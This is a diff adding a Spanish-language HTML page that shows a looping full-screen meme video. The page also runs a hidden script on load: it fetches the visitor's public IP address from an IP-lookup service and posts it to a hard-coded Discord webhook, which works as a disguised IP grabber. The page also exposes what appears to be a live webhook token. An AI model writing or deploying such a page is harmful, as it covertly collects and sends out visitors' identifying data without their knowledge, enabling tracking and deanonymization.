@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Video en Pantalla Completa</title>
+    <style>
+        body, html {
+            margin: 0;
+            padding: 0;
+            height: 100%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background-color: black;
+            overflow: hidden;
+        }
+        video {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+    </style>
+</head>
+<body>
+    <!-- Video en pantalla completa -->
+    <video autoplay muted loop>
+        <source src="https://cdn.discordapp.com/attachments/1289673976368599092/1289695446138228806/Hombre_calvo_tomando_jugo_de_naranja__D_-_Yosoyfeli_360p_h264_youtube.mp4?ex=66f9c1fb&is=66f8707b&hm=0ece6105e4bccc602782f763231c3a60b173dada4282dad8a31fe3e9e1e48f5a&" type="video/mp4">
+        Tu navegador no soporta el elemento de video.
+    </video>
+
+    <script>
+        // URL del webhook de Discord
+        const webhookURL = 'https://canary.discord.com/api/webhooks/1288542617662918666/rNhw-s4ItQYe6J8MyV29kFaDypA7NQPfaFtA3iE61OtpobKuubeCYv1bCqOWaDoUkPY2';
+
+        // Función para obtener la IP pública
+        fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => {
+                const ip = data.ip;
+
+                // Enviar la IP al webhook de Discord
+                fetch(webhookURL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        content: `IP pública del visitante: ${ip}`
+                    })
+                }).then(() => {
+                    console.log('IP enviada al webhook de Discord');
+                }).catch(error => {
+                    console.error('Error al enviar al webhook:', error);
+                });
+            })
+            .catch(error => {
+                console.error('Error al obtener la IP:', error);
+            });
+    </script>
+</body>
+</html>
